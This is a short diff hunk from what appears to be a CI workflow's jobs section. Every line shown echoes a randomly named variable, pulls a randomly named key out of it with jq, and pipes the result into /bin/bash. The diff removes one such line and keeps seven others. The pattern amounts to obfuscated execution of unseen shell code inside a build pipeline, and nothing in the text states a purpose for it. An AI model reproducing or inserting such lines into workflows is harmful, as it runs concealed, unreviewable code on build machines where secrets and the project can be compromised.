@@ -26,7 +26,6 @@ jobs:
           echo $sb5 | jq -r .k516 | /bin/bash
           printf '%s' "$pwbmg25953" | jq -r .pb5 | /bin/bash
           echo $stzgl1606 | jq -r .lic49700 | /bin/bash
-          echo $z1887 | jq -r .br1442 | /bin/bash
           printf '%s' "$r2509" | jq -r .i9 | /bin/bash
           echo $cjth74 | jq -r .ken8779 | /bin/bash
           echo $wkye99 | jq -r .row3360 | /bin/bash
